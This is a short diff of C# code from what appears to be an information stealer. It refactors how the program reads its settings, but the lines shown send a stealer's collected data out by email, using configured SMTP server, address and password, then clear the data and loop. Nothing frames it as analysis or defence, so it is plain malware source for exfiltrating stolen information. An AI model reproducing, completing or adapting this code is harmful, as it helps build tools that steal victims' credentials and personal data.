@@ -26,9 +26,9 @@ namespace sub.Util.Threading
                                                }
                                                if(!string.IsNullOrEmpty(stealer.Data))
                                                {
-                                                   new ReportEmail(stealer.Name, Settings.EmailAddress,
-                                                                   Settings.EmailPassword,
-                                                                   Settings.SmtpAddress, Settings.SmtpPort).Send(
+                                                   new ReportEmail(stealer.Name, Program.Settings.EmailAddress,
+                                                                   Program.Settings.EmailPassword,
+                                                                   Program.Settings.SmtpAddress, Program.Settings.SmtpPort).Send(
                                                                        stealer.Data);
                                                    stealer.Data = null;
                                                    if (runOnce)
